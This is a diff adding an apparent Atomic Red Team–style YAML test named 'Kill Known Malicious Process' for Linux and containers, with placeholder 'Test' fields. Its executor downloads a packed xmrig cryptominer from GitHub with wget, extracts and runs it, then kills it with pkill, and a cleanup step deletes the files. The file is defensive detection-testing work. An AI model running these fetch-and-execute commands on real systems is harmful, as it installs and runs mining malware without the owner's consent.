@@ -1,0 +1,23 @@
+attack_technique: Test
+display_name: Kill Known Malicious Process
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    Test Directory:
+      description: Path to the directory used for this test
+      type: Path
+      default: /tmp
+  executor:
+    command: |
+      wget https://github.com/sysdig/TR-Blogs/raw/main/xmrig-upx-linux-static-x64.tar -O "#{Test Directory}/xmrig.tar.gz" 2>/dev/null
+      tar -xf "#{Test Directory}/xmrig.tar.gz" -C "#{Test Directory}"
+      chmod +x "#{Test Directory}/xmrig-6.18.0/xmrig"
+      "#{Test Directory}/xmrig-6.18.0/xmrig" & sleep 2 && pkill -i xmrig
+    cleanup_command: |
+      rm -rf "#{Test Directory}/xmrig"*
+    name: bash
+    elevation_required: false
